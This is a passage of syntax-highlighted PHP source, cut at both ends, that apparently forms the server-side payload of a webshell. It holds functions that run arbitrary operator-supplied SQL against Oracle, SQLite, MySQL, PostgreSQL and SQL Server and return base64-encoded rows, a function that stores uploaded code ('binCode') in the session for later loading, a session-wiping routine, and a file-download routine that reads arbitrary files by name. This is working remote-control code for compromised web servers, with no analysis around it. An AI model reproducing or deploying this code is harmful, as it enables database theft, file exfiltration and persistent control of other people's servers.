                <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="s2">"ERROR://</span><span class="si">{</span><span class="nv">$e</span><span class="p">[</span><span class="s1">'message'</span><span class="p">]</span><span class="si">}</span><span class="s2"> in [</span><span class="si">{</span><span class="nv">$e</span><span class="p">[</span><span class="s1">'sqltext'</span><span class="p">]</span><span class="si">}</span><span class="s2">] col:</span><span class="si">{</span><span class="nv">$e</span><span class="p">[</span><span class="s1">'offset'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="s2">"false"</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">ora_exec</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$execType</span><span class="p">,</span> <span class="nv">$currentDb</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">,</span> <span class="nv">$charset</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$H</span> <span class="o">=</span> <span class="o">@</span><span class="nf">ora_plogon</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">@</span><span class="si">{</span><span class="nv">$host</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$H</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="s2">"Login Failed!"</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$T</span> <span class="o">=</span> <span class="o">@</span><span class="nf">ora_open</span><span class="p">(</span><span class="nv">$H</span><span class="p">);</span>
            <span class="o">@</span><span class="nf">ora_commitoff</span><span class="p">(</span><span class="nv">$H</span><span class="p">);</span>
            <span class="nv">$q</span> <span class="o">=</span> <span class="o">@</span><span class="nf">ora_parse</span><span class="p">(</span><span class="nv">$T</span><span class="p">,</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$sql</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
            <span class="nv">$R</span> <span class="o">=</span> <span class="nf">ora_exec</span><span class="p">(</span><span class="nv">$T</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$R</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$n</span> <span class="o">=</span> <span class="nf">ora_numcols</span><span class="p">(</span><span class="nv">$T</span><span class="p">);</span>
                <span class="nv">$data</span><span class="o">=</span><span class="s2">"ok</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nf">Ora_ColumnName</span><span class="p">(</span><span class="nv">$T</span><span class="p">,</span> <span class="nv">$i</span><span class="p">))</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">while</span> <span class="p">(</span><span class="nf">ora_fetch</span><span class="p">(</span><span class="nv">$T</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nf">ora_getcolumn</span><span class="p">(</span><span class="nv">$T</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)))</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">return</span> <span class="s2">"false"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">sqlite_exec</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$execType</span><span class="p">,</span> <span class="nv">$currentDb</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">,</span> <span class="nv">$charset</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$dbh</span><span class="o">=</span><span class="k">new</span> <span class="nc">SQLite3</span><span class="p">(</span><span class="nv">$host</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$dbh</span><span class="p">){</span>
            <span class="k">return</span> <span class="s2">"ERROR://CONNECT ERROR"</span><span class="mf">.</span><span class="nc">SQLite3</span><span class="o">::</span><span class="nf">lastErrorMsg</span><span class="p">();</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nv">$stmt</span><span class="o">=</span><span class="nv">$dbh</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$stmt</span><span class="p">){</span>
                <span class="k">return</span> <span class="s2">"ERROR://"</span><span class="mf">.</span><span class="nv">$dbh</span><span class="o">-&gt;</span><span class="nf">lastErrorMsg</span><span class="p">();</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$result</span><span class="o">=</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">();</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">){</span>
                    <span class="k">return</span> <span class="nv">$dbh</span><span class="o">-&gt;</span><span class="nf">lastErrorMsg</span><span class="p">();</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                    <span class="nv">$bool</span><span class="o">=</span><span class="kc">True</span><span class="p">;</span>
                    <span class="nv">$data</span><span class="o">=</span><span class="s2">"ok</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                    <span class="k">while</span><span class="p">(</span><span class="nv">$res</span><span class="o">=</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetchArray</span><span class="p">(</span><span class="no">SQLITE3_ASSOC</span><span class="p">)){</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$bool</span><span class="p">){</span>
                            <span class="k">foreach</span><span class="p">(</span><span class="nv">$res</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">){</span>
                                <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                            <span class="p">}</span>
                            <span class="nv">$bool</span><span class="o">=</span><span class="kc">False</span><span class="p">;</span>
                            <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$res</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">){</span>
                            <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$value</span><span class="o">!==</span><span class="kc">NULL</span><span class="o">?</span><span class="nv">$value</span><span class="o">:</span><span class="s2">"NULL"</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$bool</span><span class="p">){</span>
                        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">numColumns</span><span class="p">()){</span>
                            <span class="k">return</span> <span class="s2">"Query OK, "</span><span class="mf">.</span><span class="nv">$dbh</span><span class="o">-&gt;</span><span class="nf">changes</span><span class="p">()</span><span class="mf">.</span><span class="s2">" rows affected"</span><span class="p">;</span>
                        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                            <span class="k">return</span> <span class="s2">"ERROR://Table is empty."</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="nv">$dbh</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">pdoExec</span><span class="p">(</span><span class="nv">$databaseType</span><span class="p">,</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$sql</span><span class="p">){</span>
        <span class="nv">$conn</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$databaseType</span><span class="o">===</span><span class="s2">"oracle"</span><span class="p">){</span>
            <span class="nv">$databaseType</span><span class="o">=</span><span class="s2">"orcl"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="s2">"="</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
            <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDO</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">)){</span>
            <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDO</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$databaseType</span><span class="si">}</span><span class="s2">:host=</span><span class="nv">$host</span><span class="s2">;port=</span><span class="si">{</span><span class="nv">$port</span><span class="si">}</span><span class="s2">;dbname=</span><span class="si">{</span><span class="nv">$currentDb</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDO</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$databaseType</span><span class="si">}</span><span class="s2">:host=</span><span class="nv">$host</span><span class="s2">;port=</span><span class="si">{</span><span class="nv">$port</span><span class="si">}</span><span class="s2">;"</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">setAttribute</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$execType</span><span class="o">==</span><span class="s2">"update"</span><span class="p">){</span>
            <span class="nv">$affectRows</span><span class="o">=</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$affectRows</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
                <span class="k">return</span> <span class="s2">"Query OK, "</span><span class="mf">.</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span><span class="mf">.</span><span class="s2">" rows affected"</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"Err-&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="mf">.</span><span class="nb">implode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">errorInfo</span><span class="p">());</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nv">$data</span><span class="o">=</span><span class="s2">"ok</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
            <span class="nv">$stm</span><span class="o">=</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$stm</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">()){</span>
                <span class="nv">$row</span><span class="o">=</span><span class="nv">$stm</span><span class="o">-&gt;</span><span class="nf">fetch</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
                <span class="nv">$_row</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nb">array_keys</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$key</span><span class="p">){</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                    <span class="nv">$_row</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="nv">$key</span><span class="p">])</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nv">$_row</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span><span class="o">=</span><span class="nv">$stm</span><span class="o">-&gt;</span><span class="nf">fetch</span><span class="p">(</span><span class="mi">2</span><span class="p">)){</span>
                    <span class="k">foreach</span> <span class="p">(</span><span class="nb">array_keys</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$key</span><span class="p">){</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="nv">$key</span><span class="p">])</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"Err-&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="mf">.</span><span class="nb">implode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span><span class="nv">$stm</span><span class="o">-&gt;</span><span class="nf">errorInfo</span><span class="p">());</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$dbType</span><span class="o">==</span><span class="s2">"mysql"</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s2">"mysqli"</span><span class="p">)</span><span class="o">||</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"mysql_connect"</span><span class="p">)</span><span class="o">||</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"mysqli_connect"</span><span class="p">))){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s2">"mysqli"</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">mysqli_exec</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span><span class="nv">$dbPort</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$execSql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">);</span>
        <span class="p">}</span><span class="k">elseif</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"mysql_connect"</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">mysql_exec</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span><span class="nv">$dbPort</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$execSql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"mysqli_connect"</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">mysqliEx_exec</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span><span class="nv">$dbPort</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$execSql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">elseif</span> <span class="p">(</span><span class="nv">$dbType</span><span class="o">==</span><span class="s2">"postgresql"</span><span class="o">&amp;&amp;</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"pg_connect"</span><span class="p">)){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"pg_connect"</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">pg_execEx</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span><span class="nv">$dbPort</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$execSql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">elseif</span> <span class="p">(</span><span class="nv">$dbType</span><span class="o">==</span><span class="s2">"sqlserver"</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"sqlsrv_connect"</span><span class="p">)</span><span class="o">||</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"mssql_connect"</span><span class="p">))){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"sqlsrv_connect"</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">sqlsrv_exec</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span><span class="nv">$dbPort</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$execSql</span><span class="p">);</span>
        <span class="p">}</span><span class="k">elseif</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"mssql_connect"</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">mssql_exec</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span><span class="nv">$dbPort</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$execSql</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">elseif</span> <span class="p">(</span><span class="nv">$dbType</span><span class="o">==</span><span class="s2">"oracle"</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"oci_connect"</span><span class="p">)</span><span class="o">||</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"ora_plogon"</span><span class="p">))){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"oci_connect"</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">oci_exec</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span><span class="nv">$dbPort</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$execSql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"ora_plogon"</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">oci_exec</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span><span class="nv">$dbPort</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$execSql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">elseif</span> <span class="p">(</span><span class="nv">$dbType</span><span class="o">==</span><span class="s2">"sqlite"</span><span class="o">&amp;&amp;</span><span class="nb">class_exists</span><span class="p">(</span><span class="s2">"SQLite3"</span><span class="p">)){</span>
        <span class="k">return</span> <span class="nb">sqlite_exec</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span><span class="nv">$dbPort</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$execSql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s2">"pdo"</span><span class="p">)){</span>
        <span class="k">return</span> <span class="nf">pdoExec</span><span class="p">(</span><span class="nv">$dbType</span><span class="p">,</span><span class="nv">$dbHost</span><span class="p">,</span><span class="nv">$dbPort</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$execSql</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"no extension"</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="k">function</span> <span class="n">base64Encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
    <span class="k">return</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">test</span><span class="p">(){</span>
    <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
    <span class="k">global</span> <span class="nv">$parameters</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">[</span><span class="nv">$key</span><span class="p">])){</span>
        <span class="k">return</span> <span class="nv">$parameters</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">getAllParameters</span><span class="p">(){</span>
    <span class="k">global</span> <span class="nv">$parameters</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$parameters</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">includeCode</span><span class="p">(){</span>
    <span class="nv">$classCode</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"binCode"</span><span class="p">);</span>
    <span class="nv">$codeName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"codeName"</span><span class="p">);</span>
    <span class="nv">$_SES</span><span class="o">=&amp;</span><span class="nf">getSession</span><span class="p">();</span>
    <span class="nv">$_SES</span><span class="p">[</span><span class="nv">$codeName</span><span class="p">]</span><span class="o">=</span><span class="nv">$classCode</span><span class="p">;</span>
    <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">base64Decode</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>
    <span class="k">return</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">convertFilePermissions</span><span class="p">(</span><span class="nv">$fileAttr</span><span class="p">){</span>
    <span class="nv">$mod</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$fileAttr</span><span class="p">,</span><span class="s1">'R'</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
        <span class="nv">$mod</span><span class="o">=</span><span class="nv">$mod</span><span class="o">+</span><span class="mo">0444</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$fileAttr</span><span class="p">,</span><span class="s1">'W'</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
        <span class="nv">$mod</span><span class="o">=</span><span class="nv">$mod</span><span class="o">+</span><span class="mo">0222</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$fileAttr</span><span class="p">,</span><span class="s1">'X'</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
        <span class="nv">$mod</span><span class="o">=</span><span class="nv">$mod</span><span class="o">+</span><span class="mo">0111</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$mod</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">g_close</span><span class="p">(){</span>
    <span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
    <span class="nv">$_SES</span><span class="o">=&amp;</span><span class="nf">getSession</span><span class="p">();</span>
    <span class="nv">$_SES</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">session_destroy</span><span class="p">()){</span>
        <span class="k">return</span> <span class="s2">"ok"</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="s2">"fail!"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">bigFileDownload</span><span class="p">(){</span>
    <span class="nv">$mode</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"mode"</span><span class="p">);</span>
    <span class="nv">$fileName</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"fileName"</span><span class="p">);</span>
    <span class="nv">$readByteNum</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"readByteNum"</span><span class="p">);</span>
    <span class="nv">$position</span><span class="o">=</span><span class="nf">get</span><span class="p">(</span><span class="s2">"position"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span><span class="o">==</span><span class="s2">"fileSize"</span><span class="p">){</span>
        <span class="k">return</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">)</span><span class="mf">.</span><span class="s2">""</span><span class="p">;</span>
